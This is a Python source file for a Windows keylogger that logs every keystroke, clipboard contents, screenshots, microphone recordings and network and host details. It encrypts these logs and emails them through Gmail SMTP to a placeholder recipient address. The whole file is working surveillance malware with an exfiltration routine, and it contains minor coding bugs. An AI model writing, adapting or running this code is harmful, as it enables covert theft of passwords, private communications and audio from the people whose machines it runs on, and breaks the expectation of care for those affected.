# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import subprocess
import socket

import win32clipboard

import sounddevice as sd
from scipy.io.wavfile import write

from PIL import ImageGrab

from pynput.keyboard import Key, Listener

from cryptography.fernet import Fernet

import os


    # Global variables 
file_path=os.path.abspath(os.path.dirname(__file__))
extends="\\"

keys_file="keys_info.txt"
sys_file="sys_info.txt"
clipboard_file="clipboard_info.txt"
record_file="record_info_"
screenshot_file="creenshot_info_"

i=0
i1=0
nb=0

count=0
keys=[]

email="test@gmail.com"
password="********"
to_add="destination@gmail.com"


    # Send emails
def send_mail(filename,attachment,to_add):
    global email, password 
    msg = MIMEMultipart()
    msg["From"] = email
    msg["To"] = to_add
    msg["Subject"] = "Keylogger"
    
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s=smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email,password)
    s.sendmail(email,to_add,msg.as_string)
    s.quit()

    # Take a screenshot 
def screenshot():
    global i
    img=ImageGrab.grab()
    img.save(file_path + extends + screenshot_file+str(i)+".png")
    i+=1

    # Get the computer information
def get_systeme_informations():
    with open(file_path + extends + sys_file,"w") as f :
        result = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, text=True)
        ifconfig_output = result.stdout
        f.write(ifconfig_output+'\n') 
        hostname = socket.gethostname()
        f.write('hostname=  '+hostname+'\n')

    # Get the clipboard content 
def copy_clipboard():
    with open (file_path + extends + clipboard_file,"a") as f :
        win32clipboard.OpenClipboard()
        try :
            pasted_data = win32clipboard.GetClipboardData()
            f.write('\n')
            f.write(pasted_data)
        finally:
            win32clipboard.CloseClipboard()

    # Record a voice clip 
def record_sound():
    global i1
    fs=44100
    recording = sd.rec(int(5 * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extends + record_file+str(i1)+".wav", fs, recording)
    i1+=1

    # Write the keys into the destination file 
def write_to_file(keys):
    with open(file_path + extends + keys_file, "a") as f:
        for key in keys:
            ch=str(key).replace("'","")
            if  (key==Key.enter):
                f.write('\n')
            
            elif (key==Key.space) : 
                f.write(' ')
            
            elif (key==Key.backspace):
                f.write(' #backspace# ')
            
            elif (ch=="<110>"):
                f.write('.')
            
            elif ((ch[0]=="<") and (ch[-1]==">")):    # number 0  <=> <96>  
                f.write(str(int(ch[1:-1])-96))

            else :
                f.write(ch)
    f.close()

def press(key):
    global keys,count,nb
    print('{} Pressed'.format(key))
    keys.append(key)
    count+=1
    if (count==2):
        nb+=1
        write_to_file(keys)
        count=0
        keys=[]
    if ( nb== 40 ):
        nb=0
        copy_clipboard()
        record_sound()
        screenshot()
    
def release(key):
    if key==Key.esc:
        return False

with Listener(on_press=press,on_release=release) as l :  
    l.join()    

get_systeme_informations()
copy_clipboard()
record_sound()
screenshot()

    # Encrypt files 
files_to_encrypt=["keys_info.txt","sys_info.txt","clipboard_info.txt"]

i=0
while i<3 :
    try:
        with open(file_path + extends + files_to_encrypt[i], 'rb') as f:
            data=f.read()
        key = Fernet.generate_key()
        with open(file_path + extends + "key.txt", 'wb') as f1:
            f1.write(key)
        
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        with open(file_path + extends + "enc_"+ files_to_encrypt[i], 'wb') as f:
            f.write(encrypted)
    except Exception:
        pass
    finally:
        i+=1


    # Delete unencrypted Files
for file in files_to_encrypt:
    try:
        os.remove(file_path + extends + file)
    except Exception :
        pass

    # Send the encrypted files via gmail
for file in files_to_encrypt:
    send_mail(file,file_path + extends + "enc_" + file,to_add)













